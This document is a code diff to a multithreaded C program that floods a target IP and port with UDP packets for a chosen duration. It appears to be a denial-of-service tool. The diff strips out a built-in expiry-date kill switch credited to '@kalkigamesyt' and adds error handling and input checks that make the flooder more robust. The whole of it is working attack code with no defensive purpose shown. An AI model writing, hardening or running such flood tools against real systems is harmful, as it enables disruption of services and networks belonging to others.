@@ -6,7 +6,7 @@
 #include <arpa/inet.h>
 #include <time.h>
 
-#define PAYLOAD_SIZE 13000
+#define PAYLOAD_SIZE 11000
 
 typedef struct {
     char *ip;
@@ -15,24 +15,9 @@ typedef struct {
     int thread_id;
 } thread_data;
 
-// Define the expiry date
-#define EXPIRY_YEAR 2024
-#define EXPIRY_MONTH 10
-#define EXPIRY_DAY 25
-
-// Function to check if the current date has passed the expiry date
-int is_expired() {
-    time_t now = time(NULL);
-    struct tm *current_time = localtime(&now);
-    
-    if (current_time->tm_year + 1900 > EXPIRY_YEAR) return 1;
-    if (current_time->tm_year + 1900 == EXPIRY_YEAR) {
-        if (current_time->tm_mon + 1 > EXPIRY_MONTH) return 1;
-        if (current_time->tm_mon + 1 == EXPIRY_MONTH) {
-            if (current_time->tm_mday > EXPIRY_DAY) return 1;
-        }
-    }
-    return 0;
+void generate_payload(char *buffer, int thread_id, int packet_count) {
+    // Generate a unique payload for each packet
+    snprintf(buffer, PAYLOAD_SIZE, "Thread %d - Packet %d - Timestamp: %ld", thread_id, packet_count, time(NULL));
 }
 
 void *send_udp_packets(void *arg) {
@@ -51,22 +36,24 @@ void *send_udp_packets(void *arg) {
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(data->port);
-    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);
+    if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
+        perror("Invalid address/ Address not supported");
+        close(sockfd);
+        return NULL;
+    }
 
     time_t start_time = time(NULL);
     int packet_count = 0;
 
     while (difftime(time(NULL), start_time) < data->duration) {
-        if (is_expired()) {
-            printf("This script is closed by @kalkigamesyt due to expiry date.\n");
-            break;  // Exit loop if expired
-        }
-        
-        // Create a dynamic payload
-        snprintf(payload, PAYLOAD_SIZE, "Thread %d - Packet %d", data->thread_id, packet_count++);
+        // Generate a dynamic payload
+        generate_payload(payload, data->thread_id, packet_count++);
         
         // Send the UDP packet
-        sendto(sockfd, payload, strlen(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+        if (sendto(sockfd, payload, strlen(payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+            perror("Failed to send packet");
+            break; // Exit loop on send failure
+        }
     }
 
     close(sockfd);
@@ -83,8 +70,19 @@ int main(int argc, char *argv[]) {
     int port = atoi(argv[2]);
     int duration = atoi(argv[3]);
     int num_threads = atoi(argv[4]);
+
+    if (port <= 0 || port > 65535 || duration <= 0 || num_threads <= 0) {
+        fprintf(stderr, "Port must be between 1 and 65535, duration and threads must be positive.\n");
+        return 1;
+    }
+
     pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
     thread_data *data = malloc(num_threads * sizeof(thread_data));
+
+    if (!threads || !data) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return 1;
+    }
 
     // Create threads
     for (int i = 0; i < num_threads; i++) {
@@ -94,6 +92,8 @@ int main(int argc, char *argv[]) {
         data[i].thread_id = i + 1; // Unique thread ID
         if (pthread_create(&threads[i], NULL, send_udp_packets, &data[i]) != 0) {
             perror("Failed to create thread");
+            free(threads);
+            free(data);
             return 1;
         }
     }
